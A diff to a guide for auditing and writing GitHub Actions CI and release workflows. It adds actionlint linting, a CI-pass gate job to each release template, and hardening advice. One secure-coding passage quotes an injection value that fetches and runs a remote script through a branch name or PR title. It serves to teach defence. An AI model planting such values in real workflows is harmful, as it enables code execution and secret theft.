@@ -40,14 +40,19 @@ session start detects workflows that exist but may have issues — read every
    the same severity levels as the security scan:
    - 🚨 **Critical** — unpinned third-party actions (supply-chain risk),
      secrets echoed in `run:` blocks, `permissions: write-all`, missing
-     tag-on-default-branch check in release workflows
+     tag-on-default-branch check in release workflows, `${{ }}` expression
+     interpolated directly into a `run:` script instead of passed through `env:`
    - ⚠️ **High** — `persist-credentials: true` (or missing, which defaults to
      true), no concurrency groups (race conditions), no timeouts (stuck builds
      waste runner minutes), release workflow with `cancel-in-progress: true`
-     (can cancel a release mid-flight)
+     (can cancel a release mid-flight), release workflow that checks the tag is
+     on the default branch but never checks whether CI actually passed for that
+     commit
    - 📝 **Medium** — CI reimplements build inline instead of calling project
      scripts, no `set -euo pipefail` in multi-line run blocks, no artifact
-     verification after upload
+     verification after upload, CI trigger is a bare `push:` (also matches tag
+     pushes — runs the suite twice on release) instead of `branches: ['**']`,
+     no `lint-workflows.yml` for a repo with multiple workflow files
    - 💡 **Low** — missing shellcheck for projects with shell scripts, no
      release notes extraction, actions pinned to version tags instead of SHAs
      (first-party GitHub actions)
@@ -175,6 +180,9 @@ relevant questions batched together.
 7. **Dev releases**: Do you want to be able to push pre-release tags from
    feature branches for testing? (e.g., `v1.0.0-dev.1` builds from your
    working branch, marked as pre-release on GitHub)
+8. **Workflow linting**: Add `lint-workflows.yml` (runs `actionlint` on
+   `.github/workflows/**` changes)? Recommended whenever any workflow is being
+   added — see [Workflow linting](#workflow-linting).
 
 **Environment-specific questions to include in the same turn:**
 
@@ -209,6 +217,76 @@ After the user answers the Step 3 questions:
 5. **Recommend Dependabot** if `.github/dependabot.yml` doesn't exist yet —
    suggest it alongside the new workflows, with an entry for **every ecosystem
    in the repo**, not just `github-actions`
+6. **Recommend `lint-workflows.yml`** if it doesn't exist yet — suggest it
+   alongside the new workflows, the same way Dependabot is suggested. See
+   [Workflow linting](#workflow-linting).
+
+---
+
+## Workflow linting
+
+A dedicated, fast, static-analysis-only workflow for the repo's own
+`.github/workflows/**` files: YAML syntax, expression/context typos, job
+dependency shape, and a shellcheck pass over `run:` blocks — all via
+[`actionlint`](https://github.com/rhysd/actionlint), without starting a
+runner environment for the app itself. Offer it whenever a CI or release
+workflow is being created or audited, the same way Dependabot is offered —
+it's what lets the CI build check safely exclude
+`.github/workflows/**` from its own trigger paths without losing coverage for
+edits to the workflow files themselves (a broken YAML file or a typo'd
+`${{ }}` expression is the common mistake for a workflow edit; actionlint
+catches it without waiting for the app's own suite to run).
+
+`actionlint` ships as a binary, not a GitHub Action, so it can't be pinned to
+a commit SHA the usual way. Pin the version and verify the release's own
+checksum before executing it — download an unpinned or unverified binary and
+you're running someone else's code with this job's token:
+
+```yaml
+name: Lint workflows
+
+on:
+  push:
+    branches: ['**']
+    paths:
+      - '.github/workflows/**'
+  pull_request:
+    paths:
+      - '.github/workflows/**'
+
+jobs:
+  actionlint:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+
+      - name: Download actionlint
+        env:
+          # Bumped by hand; checksum copied from the release's own
+          # *_checksums.txt, not computed after the fact, so a tampered or
+          # substituted binary is refused rather than silently trusted.
+          ACTIONLINT_VERSION: 1.7.12
+          ACTIONLINT_SHA256: 8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8
+        run: |
+          set -euo pipefail
+          curl -fsSL -o actionlint.tar.gz \
+            "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
+          echo "${ACTIONLINT_SHA256}  actionlint.tar.gz" | sha256sum -c -
+          tar xzf actionlint.tar.gz actionlint
+
+      - name: Run actionlint
+        run: ./actionlint -color
+```
+
+**Adaptation notes:**
+- Check [actionlint's releases page](https://github.com/rhysd/actionlint/releases)
+  for the current version and its published `_checksums.txt` when bumping —
+  never write the checksum from memory.
+- This workflow is why the CI build check's own trigger can safely carry
+  `paths-ignore: ['.github/workflows/**']` (see Reliability, above) — without
+  it, that exclusion would leave workflow-file edits completely unchecked.
 
 ---
 
@@ -263,6 +341,62 @@ and match the patterns already used in this repo's own workflows.
         exit 1
       fi
   ```
+  **This alone is not enough.** Being on the default branch proves the commit
+  was merged — it says nothing about whether CI ever ran against it, or
+  passed. A tag pushed against a commit whose CI went red publishes exactly
+  the same way a green one does unless something checks the run's conclusion.
+  Pair it with a **CI-status gate**, in its own job so the polling step
+  carries only the read permissions it needs, never the release job's
+  `contents: write`/`packages: write`:
+  ```yaml
+  jobs:
+    gate:
+      runs-on: ubuntu-latest
+      permissions:
+        actions: read
+        contents: read
+      steps:
+        - name: Require a passing CI run for this commit
+          env:
+            GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+            REPO: ${{ github.repository }}
+            SHA: ${{ github.sha }}
+          run: |
+            set -euo pipefail
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion)"')
+            printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }' \
+              || { echo "::error::CI never passed for ${SHA}."; exit 1; }
+    release:
+      needs: gate
+      # ...
+  ```
+  The full version — with a wait loop for a run still in progress, since
+  tagging right after pushing the branch is normal and CI takes minutes — is
+  in every release template below. Rerunning the whole suite on tag push
+  instead would re-prove what the branch push already proved, at the cost of
+  the suite's full runtime on every release; asking the API what already
+  happened is the cheaper and equally strict check.
+- **Never interpolate an untrusted or attacker-influenceable value directly
+  into a `run:` script.** `${{ github.ref_name }}`, `${{ github.head_ref }}`,
+  a PR title, an issue title, or a commit message are template-expanded into
+  the script's *text* before the shell ever sees it — a ref or title
+  containing `"; curl evil.sh | sh #` becomes code, not data. Read the value
+  through `env:` and reference it as a shell variable instead, so it stays a
+  string:
+  ```yaml
+  # bad — the tag name is spliced into the script before bash runs it
+  - run: echo "Releasing ${{ github.ref_name }}"
+
+  # good — the tag name arrives as an environment variable's value
+  - env:
+      TAG: ${{ github.ref_name }}
+    run: echo "Releasing $TAG"
+  ```
+  This matters most for values a fork PR or an external contributor can set
+  (PR title, branch name, issue title) — `pull_request_target` combined with
+  this pattern is a known path to secret exfiltration and repo write access.
 - **Environment protection rules** for release jobs. Use GitHub's
   `environment:` feature with deployment protection rules (approval gates,
   branch restrictions) for publish workflows:
@@ -299,6 +433,37 @@ and match the patterns already used in this repo's own workflows.
       make build
       make test
   ```
+- **`branches: ['**']`, not a bare `push:`, on the CI trigger.** A bare
+  `push:` also matches a tag push — which is exactly what the release
+  workflow's tag trigger fires on — so tagging a commit CI already passed on
+  the branch push runs the whole suite a second time against nothing new:
+  ```yaml
+  on:
+    push:
+      branches: ['**']   # not just `push:` — that also matches tag pushes
+    pull_request:
+  ```
+- **`paths-ignore` for changes nothing tests reads** (README, CHANGELOG,
+  `docs/**`) — but verify what the suite actually reads before excluding a
+  path, don't assume. Excluding paths creates an edge case the release gate
+  above must handle: a commit that only touched an ignored path has no CI run
+  to check. Give the CI workflow a `workflow_dispatch` trigger too, so that
+  commit can get a manual run before it's tagged — the gate's error message
+  should point at this option.
+- **`DEBIAN_FRONTEND=noninteractive` around any `apt-get install`** on an
+  `ubuntu-latest` job. Some packages (`wireshark-common`, `tzdata`, others
+  with a postinst debconf prompt) ask an interactive question on install; without
+  this the step hangs until the job times out instead of failing fast:
+  ```yaml
+  - name: Install system packages
+    env:
+      DEBIAN_FRONTEND: noninteractive
+    run: sudo apt-get update && sudo apt-get install -y --no-install-recommends <pkg>
+  ```
+  Runner-dependent, not target-platform-dependent — it applies to any job
+  that runs on `ubuntu-latest` and calls `apt-get`, regardless of what OS the
+  project itself targets. Windows-runner jobs use a different package manager
+  and don't hit this.
 
 ### Structure
 
@@ -383,9 +548,14 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  release:
+  # A commit reaching the default branch proves nothing on its own about
+  # whether CI passed on it -- only that it was merged. This job is the one
+  # place that checks both before anything gets built or published.
+  gate:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    permissions:
+      actions: read
+      contents: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -402,6 +572,60 @@ jobs:
             echo "Releases come from the default branch only."
             exit 1
           fi
+
+      - name: Require a passing CI run for this commit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          # Tagging right after pushing the branch is normal, and CI takes
+          # minutes -- so an in-progress run is waited on, not treated as a
+          # failure. This job never runs CI itself: it only asks whether
+          # ci.yml already ran and passed for this exact commit.
+          deadline=$(( $(date +%s) + 1800 ))
+          while true; do
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion) \(.html_url)"')
+
+            if [ -z "$runs" ]; then
+              echo "::error::CI has never run for ${SHA}, so nothing has tested this commit."
+              echo "Push the branch so CI runs on it, or dispatch it by hand" >&2
+              echo "(Actions -> CI -> Run workflow), then re-tag." >&2
+              exit 1
+            fi
+
+            if printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }'; then
+              echo "CI passed for ${SHA}."
+              exit 0
+            fi
+
+            unfinished=$(printf '%s\n' "$runs" | awk '$1 != "completed"' | wc -l)
+            if [ "$unfinished" -eq 0 ]; then
+              echo "::error::CI ran for ${SHA} and did not pass. Refusing to release."
+              printf '%s\n' "$runs" | sed 's/^/  /' >&2
+              exit 1
+            fi
+
+            echo "CI is still running for ${SHA} (${unfinished} unfinished) -- waiting."
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Timed out waiting for CI on ${SHA} to finish."
+              exit 1
+            fi
+            sleep 20
+          done
+
+  release:
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
 
       - name: Set up Docker Buildx
         uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0
@@ -466,6 +690,25 @@ jobs:
 - For Docker Hub: swap login action, set `images:` to `docker.io/<user>/<repo>`
 - For multi-arch: uncomment `platforms:` line, increase timeout to 30 min
 - For private registries: add registry URL to login and metadata actions
+- **For a floating `:dev`/`:latest`-style tag** (this template's
+  `docker/metadata-action` block already handles the standard `:latest`
+  case): if the project instead hand-rolls a moving tag — e.g. a separate
+  `:dev` channel tracking prerelease builds — guard it against ever moving
+  backward. Nothing about a tag push says it's the newest version: backfilling
+  a version that was skipped, or re-tagging an old commit, republishes an
+  older build through this same workflow, and without a check that build
+  claims the floating tag and silently downgrades whoever pulls it. Compare
+  the version being built against every existing tag of its own kind (dev
+  against dev, stable against stable — don't compare across kinds; a plain
+  `sort -V` places `1.0.0` before `1.0.0-dev.2`, which is correct for neither):
+  ```bash
+  versions="$(git ls-remote --tags origin 'refs/tags/v*' \
+    | sed 's#.*refs/tags/v##' | grep -v '\^{}$')"
+  newest_dev="$(printf '%s\n' "$versions" | { grep -- '-dev' || true; } | sort -V | tail -n1)"
+  if [ "$version" = "$newest_dev" ]; then
+    tags="${tags}"$'\n'"${image}:dev"     # only move :dev when this IS the newest dev build
+  fi
+  ```
 
 ---
 
@@ -534,9 +777,17 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  release:
-    runs-on: windows-latest
-    timeout-minutes: 20
+  # A commit reaching the default branch proves nothing on its own about
+  # whether CI passed on it -- only that it was merged. This job is the one
+  # place that checks both before anything gets built or published. It runs
+  # on ubuntu-latest even though the build itself needs windows-latest --
+  # git and gh both work fine here, and there's no reason to spend a Windows
+  # runner minute on a check that doesn't touch Windows.
+  gate:
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -544,7 +795,6 @@ jobs:
           persist-credentials: false
 
       - name: Verify tag is on default branch
-        shell: bash
         env:
           DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
         run: |
@@ -554,6 +804,56 @@ jobs:
             echo "Releases come from the default branch only."
             exit 1
           fi
+
+      - name: Require a passing CI run for this commit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 1800 ))
+          while true; do
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion) \(.html_url)"')
+
+            if [ -z "$runs" ]; then
+              echo "::error::CI has never run for ${SHA}, so nothing has tested this commit."
+              echo "Push the branch so CI runs on it, or dispatch it by hand" >&2
+              echo "(Actions -> CI -> Run workflow), then re-tag." >&2
+              exit 1
+            fi
+
+            if printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }'; then
+              echo "CI passed for ${SHA}."
+              exit 0
+            fi
+
+            unfinished=$(printf '%s\n' "$runs" | awk '$1 != "completed"' | wc -l)
+            if [ "$unfinished" -eq 0 ]; then
+              echo "::error::CI ran for ${SHA} and did not pass. Refusing to release."
+              printf '%s\n' "$runs" | sed 's/^/  /' >&2
+              exit 1
+            fi
+
+            echo "CI is still running for ${SHA} (${unfinished} unfinished) -- waiting."
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Timed out waiting for CI on ${SHA} to finish."
+              exit 1
+            fi
+            sleep 20
+          done
+
+  release:
+    needs: gate
+    runs-on: windows-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
 
       - name: Setup .NET
         uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
@@ -713,9 +1013,14 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  release:
+  # A commit reaching the default branch proves nothing on its own about
+  # whether CI passed on it -- only that it was merged. This job is the one
+  # place that checks both before anything gets built or published.
+  gate:
     runs-on: ubuntu-latest
-    timeout-minutes: 15
+    permissions:
+      actions: read
+      contents: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -732,6 +1037,56 @@ jobs:
             echo "Releases come from the default branch only."
             exit 1
           fi
+
+      - name: Require a passing CI run for this commit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 1800 ))
+          while true; do
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion) \(.html_url)"')
+
+            if [ -z "$runs" ]; then
+              echo "::error::CI has never run for ${SHA}, so nothing has tested this commit."
+              echo "Push the branch so CI runs on it, or dispatch it by hand" >&2
+              echo "(Actions -> CI -> Run workflow), then re-tag." >&2
+              exit 1
+            fi
+
+            if printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }'; then
+              echo "CI passed for ${SHA}."
+              exit 0
+            fi
+
+            unfinished=$(printf '%s\n' "$runs" | awk '$1 != "completed"' | wc -l)
+            if [ "$unfinished" -eq 0 ]; then
+              echo "::error::CI ran for ${SHA} and did not pass. Refusing to release."
+              printf '%s\n' "$runs" | sed 's/^/  /' >&2
+              exit 1
+            fi
+
+            echo "CI is still running for ${SHA} (${unfinished} unfinished) -- waiting."
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Timed out waiting for CI on ${SHA} to finish."
+              exit 1
+            fi
+            sleep 20
+          done
+
+  release:
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
 
       - name: Check shell scripts
         run: |
@@ -850,9 +1205,14 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  release:
+  # A commit reaching the default branch proves nothing on its own about
+  # whether CI passed on it -- only that it was merged. This job is the one
+  # place that checks both before anything gets built or published.
+  gate:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    permissions:
+      actions: read
+      contents: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -869,6 +1229,56 @@ jobs:
             echo "Releases come from the default branch only."
             exit 1
           fi
+
+      - name: Require a passing CI run for this commit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 1800 ))
+          while true; do
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion) \(.html_url)"')
+
+            if [ -z "$runs" ]; then
+              echo "::error::CI has never run for ${SHA}, so nothing has tested this commit."
+              echo "Push the branch so CI runs on it, or dispatch it by hand" >&2
+              echo "(Actions -> CI -> Run workflow), then re-tag." >&2
+              exit 1
+            fi
+
+            if printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }'; then
+              echo "CI passed for ${SHA}."
+              exit 0
+            fi
+
+            unfinished=$(printf '%s\n' "$runs" | awk '$1 != "completed"' | wc -l)
+            if [ "$unfinished" -eq 0 ]; then
+              echo "::error::CI ran for ${SHA} and did not pass. Refusing to release."
+              printf '%s\n' "$runs" | sed 's/^/  /' >&2
+              exit 1
+            fi
+
+            echo "CI is still running for ${SHA} (${unfinished} unfinished) -- waiting."
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Timed out waiting for CI on ${SHA} to finish."
+              exit 1
+            fi
+            sleep 20
+          done
+
+  release:
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
 
       - name: Extract release notes
         run: |
@@ -975,9 +1385,14 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  release:
+  # A commit reaching the default branch proves nothing on its own about
+  # whether CI passed on it -- only that it was merged. This job is the one
+  # place that checks both before anything gets built or published.
+  gate:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    permissions:
+      actions: read
+      contents: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -994,6 +1409,56 @@ jobs:
             echo "Releases come from the default branch only."
             exit 1
           fi
+
+      - name: Require a passing CI run for this commit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 1800 ))
+          while true; do
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion) \(.html_url)"')
+
+            if [ -z "$runs" ]; then
+              echo "::error::CI has never run for ${SHA}, so nothing has tested this commit."
+              echo "Push the branch so CI runs on it, or dispatch it by hand" >&2
+              echo "(Actions -> CI -> Run workflow), then re-tag." >&2
+              exit 1
+            fi
+
+            if printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }'; then
+              echo "CI passed for ${SHA}."
+              exit 0
+            fi
+
+            unfinished=$(printf '%s\n' "$runs" | awk '$1 != "completed"' | wc -l)
+            if [ "$unfinished" -eq 0 ]; then
+              echo "::error::CI ran for ${SHA} and did not pass. Refusing to release."
+              printf '%s\n' "$runs" | sed 's/^/  /' >&2
+              exit 1
+            fi
+
+            echo "CI is still running for ${SHA} (${unfinished} unfinished) -- waiting."
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Timed out waiting for CI on ${SHA} to finish."
+              exit 1
+            fi
+            sleep 20
+          done
+
+  release:
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
 
       - name: Validate scripts before release
         run: |
@@ -1114,9 +1579,14 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  release:
+  # A commit reaching the default branch proves nothing on its own about
+  # whether CI passed on it -- only that it was merged. This job is the one
+  # place that checks both before anything gets built or published.
+  gate:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    permissions:
+      actions: read
+      contents: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -1139,6 +1609,56 @@ jobs:
             echo "Use a pre-release tag (e.g., v1.0.0-dev.1) for feature branch builds."
             exit 1
           fi
+
+      - name: Require a passing CI run for this commit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 1800 ))
+          while true; do
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion) \(.html_url)"')
+
+            if [ -z "$runs" ]; then
+              echo "::error::CI has never run for ${SHA}, so nothing has tested this commit."
+              echo "Push the branch so CI runs on it, or dispatch it by hand" >&2
+              echo "(Actions -> CI -> Run workflow), then re-tag." >&2
+              exit 1
+            fi
+
+            if printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }'; then
+              echo "CI passed for ${SHA}."
+              exit 0
+            fi
+
+            unfinished=$(printf '%s\n' "$runs" | awk '$1 != "completed"' | wc -l)
+            if [ "$unfinished" -eq 0 ]; then
+              echo "::error::CI ran for ${SHA} and did not pass. Refusing to release."
+              printf '%s\n' "$runs" | sed 's/^/  /' >&2
+              exit 1
+            fi
+
+            echo "CI is still running for ${SHA} (${unfinished} unfinished) -- waiting."
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Timed out waiting for CI on ${SHA} to finish."
+              exit 1
+            fi
+            sleep 20
+          done
+
+  release:
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
 
       - name: Set up JDK
         uses: actions/setup-java@c5195efecf7bdfc987ee8bae7a71cb8b11521c00 # v4.7.1
@@ -1334,12 +1854,14 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  release:
+  # A commit reaching the default branch proves nothing on its own about
+  # whether CI passed on it -- only that it was merged. This job is the one
+  # place that checks both before anything gets built or published.
+  gate:
     runs-on: ubuntu-latest
-    timeout-minutes: 15
-    environment:
-      name: pypi
-      url: https://pypi.org/p/${{ github.event.repository.name }}
+    permissions:
+      actions: read
+      contents: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -1356,6 +1878,59 @@ jobs:
             echo "Releases come from the default branch only."
             exit 1
           fi
+
+      - name: Require a passing CI run for this commit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 1800 ))
+          while true; do
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion) \(.html_url)"')
+
+            if [ -z "$runs" ]; then
+              echo "::error::CI has never run for ${SHA}, so nothing has tested this commit."
+              echo "Push the branch so CI runs on it, or dispatch it by hand" >&2
+              echo "(Actions -> CI -> Run workflow), then re-tag." >&2
+              exit 1
+            fi
+
+            if printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }'; then
+              echo "CI passed for ${SHA}."
+              exit 0
+            fi
+
+            unfinished=$(printf '%s\n' "$runs" | awk '$1 != "completed"' | wc -l)
+            if [ "$unfinished" -eq 0 ]; then
+              echo "::error::CI ran for ${SHA} and did not pass. Refusing to release."
+              printf '%s\n' "$runs" | sed 's/^/  /' >&2
+              exit 1
+            fi
+
+            echo "CI is still running for ${SHA} (${unfinished} unfinished) -- waiting."
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Timed out waiting for CI on ${SHA} to finish."
+              exit 1
+            fi
+            sleep 20
+          done
+
+  release:
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    environment:
+      name: pypi
+      url: https://pypi.org/p/${{ github.event.repository.name }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
 
       - name: Set up Python
         uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
@@ -1477,9 +2052,14 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  release:
+  # A commit reaching the default branch proves nothing on its own about
+  # whether CI passed on it -- only that it was merged. This job is the one
+  # place that checks both before anything gets built or published.
+  gate:
     runs-on: ubuntu-latest
-    timeout-minutes: 15
+    permissions:
+      actions: read
+      contents: read
     steps:
       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
@@ -1496,6 +2076,56 @@ jobs:
             echo "Releases come from the default branch only."
             exit 1
           fi
+
+      - name: Require a passing CI run for this commit
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + 1800 ))
+          while true; do
+            runs=$(gh api \
+              "repos/${REPO}/actions/workflows/ci.yml/runs?head_sha=${SHA}&per_page=100" \
+              --jq '.workflow_runs[] | "\(.status) \(.conclusion) \(.html_url)"')
+
+            if [ -z "$runs" ]; then
+              echo "::error::CI has never run for ${SHA}, so nothing has tested this commit."
+              echo "Push the branch so CI runs on it, or dispatch it by hand" >&2
+              echo "(Actions -> CI -> Run workflow), then re-tag." >&2
+              exit 1
+            fi
+
+            if printf '%s\n' "$runs" | awk '$2 == "success" { hit = 1 } END { exit !hit }'; then
+              echo "CI passed for ${SHA}."
+              exit 0
+            fi
+
+            unfinished=$(printf '%s\n' "$runs" | awk '$1 != "completed"' | wc -l)
+            if [ "$unfinished" -eq 0 ]; then
+              echo "::error::CI ran for ${SHA} and did not pass. Refusing to release."
+              printf '%s\n' "$runs" | sed 's/^/  /' >&2
+              exit 1
+            fi
+
+            echo "CI is still running for ${SHA} (${unfinished} unfinished) -- waiting."
+            if [ "$(date +%s)" -ge "$deadline" ]; then
+              echo "::error::Timed out waiting for CI on ${SHA} to finish."
+              exit 1
+            fi
+            sleep 20
+          done
+
+  release:
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+          persist-credentials: false
 
       - name: Set up Node.js
         uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
